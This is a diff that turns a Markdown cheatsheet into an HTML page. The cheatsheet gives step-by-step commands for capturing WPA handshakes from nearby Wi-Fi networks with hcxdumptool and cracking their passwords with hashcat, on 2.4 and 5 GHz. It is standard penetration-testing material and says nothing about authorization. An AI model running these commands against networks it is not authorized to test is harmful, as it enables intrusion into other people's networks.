@@ -1,192 +1,119 @@
-
-```markdown
-# Wi-Fi Handshake Capture & Crack Cheatsheet
-
-## Table of Contents
-
-- [Preliminary Commands & Information Retrieval](#preliminary-commands--information-retrieval)
-- [Capture & Conversion Phase](#capture--conversion-phase)
-- [Additional Scans & Information](#additional-scans--information)
-- [Cracking Phase](#cracking-phase)
-- [5GHz Network Capturing Cheat Sheet](#5ghz-network-capturing-cheat-sheet)
-
-## Preliminary Commands & Information Retrieval
-
-### Secure Copy from Remote Device
-
-```bash
-scp -r root@172.16.42.1:/root/example.pcapng /home/username/Desktop
-```
-
-📖 Downloads files from remote devices using SCP.
-
-### Check Wireless Interfaces
-
-```bash
-iwconfig
-```
-
-📖 Displays wireless network interface details.
-
-### Kill Interfering Services
-
-```bash
-airmon-ng check kill
-```
-
-📖 Stops services that might interfere with wireless tools.
-
----
-
-## Capture & Conversion Phase
-
-### Set Wireless Card to Monitor Mode
-
-```bash
-sudo ip link set wlan0 down
-sudo iw wlan0 set monitor control
-sudo ip link set wlan0 up
-
-# Set back to normal
-ip link set wlan0mon down
-iwconfig wlan0mon mode managed
-ip link set wlan0 up
-```
-
-📖 Prepares the wireless card for capture.
-
-### Capture Handshakes with hcxdumptool
-
-```bash
-hcxdumptool -i wlan1 -o dumpfile.pcapng --active_beacon --enable_status=15 //OLD
-hcxdumptool -i wlan1 -w dumpfile.pcapng --disable_deauthentication --disable_beacon //NEW
-hcxdumptool -i wlan1 -w dumpfile.pcapng --disable_deauthentication --rds=1//NEW
-```
-
-📖 Captures packets from networks.
-
-### Convert Captured File for Hashcat
-
-```bash
-hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
-```
-
-📖 Converts packets for password cracking.
-
----
-
-## Additional Scans & Information
-
-### Scan for Nearby Networks
-
-```bash
-hcxdumptool --do_rcascan -i wlan1
-```
-
-📖 Scans and displays nearby networks.
-
----
-
-## Cracking Phase
-
-### Crack with Hashcat
-
-```bash
-hashcat -m 22000 hash.hc22000 wordlist.txt
-```
-
-📖 Uses hashcat to attempt password cracks.
-
----
-
-💡 `sudo systemctl stop NetworkManager.service`  
-💡 `sudo systemctl stop wpa_supplicant.service`
-
----
-
-# 5GHz Network Capturing Cheat Sheet
-
-## 1. Install Necessary Tools
-
-```bash
-sudo apt-get install hcxdumptool hcxtools
-```
-
-## 2. Check for 5GHz Support
-
-```bash
-iw list
-```
-
-## 3. Enable Monitor Mode
-
-```bash
-sudo ip link set wlan0 down
-sudo iw dev wlan0 set type monitor
-sudo ip link set wlan0 up
-```
-
-## 4. Set to 5GHz Channel
-
-```bash
-sudo iw dev wlan0 set channel 36
-```
-
-## 5. Identify Target Networks
-
-```bash
-sudo hcxdumptool -i wlan0 --scan
-```
-
-## 6. Capture Traffic
-
-```bash
-sudo hcxdumptool -i wlan0 --enable_status=1 -o output.pcapng --filterlist=filterlist.txt --filtermode=2
-```
-
-## 7. Analyze Captured Traffic
-
-```bash
-hcxpcaptool -z output.hccapx output.pcapng
-```
-
-## 8. Troubleshooting
-
-- Check regulatory domain:
-
-```bash
-sudo iw reg get
-sudo iw reg set US
-```
-
-- Check for nearby networks:
-
-```bash
-sudo iw dev wlan0 scan | grep -E '^(BSS|channel)'
-```
-
-- Check adapter capabilities:
-
-```bash
-iw list
-```
-
-## 9. Switch Back to 2.4GHz
-
-```bash
-sudo ip link set wlan0 down
-sudo iw dev wlan0 set type monitor
-sudo iw dev wlan0 set channel 6
-sudo ip link set wlan0 up
-```
-
-## 10. List 2.4GHz Channels
-
-```bash
-iw phy phy0 channels
-# or
-iwlist wlan0 channel
-```
-```
-
-Feel free to modify or add any additional information!
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wi-Fi Handshake Capture & Crack Cheatsheet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        code {
+            background-color: #f4f4f4;
+            padding: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Wi-Fi Handshake Capture & Crack Cheatsheet 📡</h1>
+
+<h2>Table of Contents 📋</h2>
+<ul>
+    <li><a href="#preliminary">Preliminary Commands & Information Retrieval</a></li>
+    <li><a href="#capture">Capture & Conversion Phase</a></li>
+    <li><a href="#additional">Additional Scans & Information</a></li>
+    <li><a href="#cracking">Cracking Phase</a></li>
+    <li><a href="#5ghz">5GHz Network Capturing Cheat Sheet</a></li>
+</ul>
+
+<h2 id="preliminary">Preliminary Commands & Information Retrieval 🛠</h2>
+<ul>
+    <li><strong>Secure Copy from Remote Device</strong></li>
+    <code>scp -r root@172.16.42.1:/root/example.pcapng /home/username/Desktop</code>
+    <p>📖 Downloads files from remote devices using SCP.</p>
+    <!-- ... -->
+    <li><strong>Check Wireless Interfaces</strong></li>
+    <code>iwconfig</code>
+    <p>📖 Displays wireless network interface details.</p>
+    <!-- ... -->
+    <li><strong>Kill Interfering Services</strong></li>
+    <code>airmon-ng check kill</code>
+    <p>📖 Stops services that might interfere with wireless tools.</p>
+</ul>
+
+<h2 id="capture">Capture & Conversion Phase 🎯</h2>
+<ul>
+    <li><strong>Set Wireless Card to Monitor Mode</strong></li>
+    <code>sudo ip link set wlan0 down</code>
+    <code>sudo iw wlan0 set monitor control</code>
+    <code>sudo ip link set wlan0 up</code>
+    <!-- ... -->
+    <p>📖 Prepares the wireless card for capture.</p>
+    <!-- ... -->
+    <!-- ... -->
+    <li><strong>Capture Handshakes with hcxdumptool</strong></li>
+    <code>hcxdumptool -i wlan1 -o dumpfile.pcapng --active_beacon --enable_status=15</code>
+    <!-- ... -->
+    <p>📖 Captures packets from networks.</p>
+    <!-- ... -->
+    <li><strong>Convert Captured File for Hashcat</strong></li>
+    <code>hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng</code>
+    <p>📖 Converts packets for password cracking.</p>
+</ul>
+
+<h2 id="additional">Additional Scans & Information 📡</h2>
+<ul>
+    <li><strong>Scan for Nearby Networks</strong></li>
+    <code>hcxdumptool --do_rcascan -i wlan1</code>
+    <p>📖 Scans and displays nearby networks.</p>
+</ul>
+
+<h2 id="cracking">Cracking Phase 🔐</h2>
+<ul>
+    <li><strong>Crack with Hashcat</strong></li>
+    <code>hashcat -m 22000 hash.hc22000 wordlist.txt</code>
+    <p>📖 Uses hashcat to attempt password cracks.</p>
+</ul>
+
+<h2 id="5ghz">5GHz Network Capturing Cheat Sheet 📶</h2>
+<ul>
+    <li><strong>1. Install Necessary Tools</strong></li>
+    <code>sudo apt-get install hcxdumptool hcxtools</code>
+
+    <li><strong>2. Check for 5GHz Support</strong></li>
+    <code>iw list</code>
+
+    <li><strong>3. Enable Monitor Mode</strong></li>
+    <code>sudo ip link set wlan0 down</code>
+    <code>sudo iw dev wlan0 set type monitor</code>
+    <code>sudo ip link set wlan0 up</code>
+
+    <li><strong>4. Set to 5GHz Channel</strong></li>
+    <code>sudo iw dev wlan0 set channel 36</code>
+
+    <li><strong>5. Identify Target Networks</strong></li>
+    <code>sudo hcxdumptool -i wlan0 --scan</code>
+
+    <li><strong>6. Capture Traffic</strong></li>
+    <code>sudo hcxdumptool -i wlan0 --enable_status=1 -o output.pcapng --filterlist=filterlist.txt --filtermode=2</code>
+
+    <li><strong>7. Analyze Captured Traffic</strong></li>
+    <code>hcxpcaptool -z output.hccapx output.pcapng</code>
+
+    <li><strong>8. Troubleshooting</strong></li>
+    <code>sudo iw reg get</code>
+    <code>sudo iw reg set US</code>
+
+    <li><strong>9. Switch Back to 2.4GHz</strong></li>
+    <code>sudo ip link set wlan0 down</code>
+    <code>sudo iw dev wlan0 set type monitor</code>
+    <code>sudo iw dev wlan0 set channel 6</code>
+    <code>sudo ip link set wlan0 up</code>
+
+    <li><strong>10. List 2.4GHz Channels</strong></li>
+    <code>iw phy phy0 channels</code>
+    <code>iwlist wlan0 channel</code>
+</ul>
+</ul>
+
+</body>
+</html>
